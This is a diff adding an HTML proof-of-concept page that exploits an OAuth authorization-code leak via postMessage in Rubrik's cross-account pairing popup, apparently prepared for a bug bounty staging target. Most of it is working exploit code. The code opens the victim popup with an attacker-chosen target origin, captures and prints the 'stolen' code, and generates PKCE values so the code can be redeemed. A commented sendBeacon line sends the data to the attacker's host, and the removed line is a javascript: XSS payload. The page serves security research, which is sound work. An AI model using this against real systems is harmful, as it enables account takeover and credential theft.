@@ -1,1 +1,122 @@
-<a href="javascript:alert(origin)">HERERERER</a>
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Rubrik Cross-Account Pairing - postMessage OAuth code leak PoC</title>
+</head>
+<body>
+<h1>Rubrik Cross-Account Pairing &mdash; OAuth authorization-code leak PoC</h1>
+
+<p><b>Finding:</b> the authorization popup sends <code>{code,state,fqdn}</code> via
+<code>window.opener.postMessage(payload, "https://" + serviceConsumerOrgUrl)</code>,
+where <code>serviceConsumerOrgUrl</code> comes straight from the URL query string with no allowlist.
+Because the attacker page is the opener AND chooses that value, the browser delivers the OAuth code to the attacker.</p>
+
+<p><b>Preconditions to reproduce (all required):</b></p>
+<ol>
+  <li>Victim is logged in to <code>bugcrowd.staging.my.rubrik-lab.com</code> in the same browser.</li>
+  <li>Victim has the <code>CREATE_CROSS_ACCOUNT_PAIR</code> privilege + replication capability
+      (otherwise the page renders NOT_PERMITTED / UNAUTHORIZED and posts a <code>null</code> payload).</li>
+  <li>Victim clicks <b>Connect</b> on the confirmation card (it will display your <code>serviceConsumerOrgUrl</code>).</li>
+  <li><b>This page must be served over HTTPS from the exact host you put in <code>serviceConsumerOrgUrl</code></b>
+      (the target origin is <code>https://&lt;that host&gt;</code>). It will NOT fire from <code>file://</code> or <code>http://</code>.</li>
+</ol>
+
+<p>
+  serviceProviderOrgUrl (the VICTIM/provider org FQDN):
+  <input id="provider" size="50" value="bugcrowd.staging.my.rubrik-lab.com">
+</p>
+<p>
+  <b>Captured oauthPayload (base64)</b> &mdash; paste the base64 <code>payload</code> value (or the raw
+  <code>createCrossAccountRegOauthPayload.oauthPayload</code> JSON object) captured in Caido from the
+  "Connect Org" wizard. <i>Leave blank to run delivery-only mode</i> (proves the cross-origin leak, but the
+  server returns AUTHORIZATION_FAILED because the made-up client_id is invalid):<br>
+  <textarea id="capturedPayload" rows="4" cols="90" placeholder="eyJjbGllbnRJZCI6Li4ufQ==   (base64)   OR   {&quot;clientId&quot;:&quot;...&quot;,&quot;state&quot;:&quot;...&quot;,...}"></textarea>
+</p>
+
+<button id="go">1) Open Rubrik authorization popup (becomes window.opener)</button>
+
+<h3>Captured / log</h3>
+<pre id="log"></pre>
+
+<script>
+// ---- config derived from the bundle ----
+const RUBRIK     = "https://bugcrowd.staging.my.rubrik-lab.com";
+const AUTHZ_PATH = "/cross_account_pairing";          // CROSS_ACCOUNT_PAIRING route
+// serviceConsumerOrgUrl MUST equal this page's own host, because the victim page
+// posts to targetOrigin = "https://" + serviceConsumerOrgUrl and only THIS origin
+// (the opener) will receive it.
+const consumer   = location.host;                      // e.g. your-attacker-domain.tld
+
+const out = document.getElementById("log");
+const log = (...a) => {
+  out.textContent += a.map(x => typeof x === "object" ? JSON.stringify(x, null, 2) : String(x)).join(" ") + "\n";
+  console.log(...a);
+};
+
+// ---- capture the leaked message ----
+window.addEventListener("message", (e) => {
+  if (e.origin !== RUBRIK) return;                     // only the Rubrik popup
+  log("\n[*] message received from", e.origin);
+  log(e.data);
+  const code = e.data && e.data.payload && e.data.payload.code;
+  if (code) {
+    log("\n[!!!] STOLEN OAuth authorization code:", code);
+    log("[+] Redeem it at the provider's /oauth/token with the code_verifier printed above.");
+    // exfil example: navigator.sendBeacon("https://"+consumer+"/collect", JSON.stringify(e.data));
+  }
+});
+
+// ---- PKCE so the stolen code is actually redeemable (attacker generates the pair) ----
+const b64url = (buf) => btoa(String.fromCharCode(...new Uint8Array(buf)))
+  .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+async function pkce() {
+  const verifier = b64url(crypto.getRandomValues(new Uint8Array(32)));
+  const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier));
+  return { verifier, challenge: b64url(digest) };
+}
+
+document.getElementById("go").onclick = async () => {
+  const captured = document.getElementById("capturedPayload").value.trim();
+  let payload;
+
+  if (captured) {
+    // Real, server-minted oauthPayload. Use it VERBATIM — the codeChallenge is bound to a
+    // verifier held by the org that minted it; do NOT regenerate PKCE here.
+    if (captured.startsWith("{")) {
+      payload = btoa(JSON.stringify(JSON.parse(captured)));   // raw JSON object -> base64
+    } else {
+      payload = captured;                                     // already base64
+    }
+    log("[+] using CAPTURED oauthPayload (real client_id) -> expect populated {code,state,fqdn}");
+  } else {
+    // Delivery-only mode: proves cross-origin postMessage delivery; server will reject the fake client_id.
+    const { verifier, challenge } = await pkce();
+    log("[+] delivery-only mode. PKCE code_verifier (attacker keeps this):", verifier);
+    const payloadObj = {                                      // h() requires all of these present/truthy
+      clientId:            "poc-client-id",
+      state:               "poc-" + Date.now(),
+      redirectUri:         "https://" + consumer + "/callback",
+      scope:               "openid",
+      responseType:        "code",
+      codeChallenge:       challenge,
+      codeChallengeMethod: "S256"
+    };
+    payload = btoa(JSON.stringify(payloadObj));               // z(payload) === JSON.parse(atob(payload))
+  }
+  const provider = document.getElementById("provider").value;
+
+  const url = RUBRIK + AUTHZ_PATH +
+    "?payload="               + encodeURIComponent(payload) +
+    "&serviceProviderOrgUrl=" + encodeURIComponent(provider) +
+    "&serviceConsumerOrgUrl=" + encodeURIComponent(consumer);
+
+  log("[+] serviceConsumerOrgUrl (= victim's targetOrigin):", "https://" + consumer);
+  log("[+] opening:", url);
+  // NO noopener -> Rubrik popup's window.opener === this page
+  window.open(url, "_blank");
+  log("[+] popup opened. As the logged-in privileged victim, click \"Connect\" in the popup.");
+};
+</script>
+</body>
+</html>
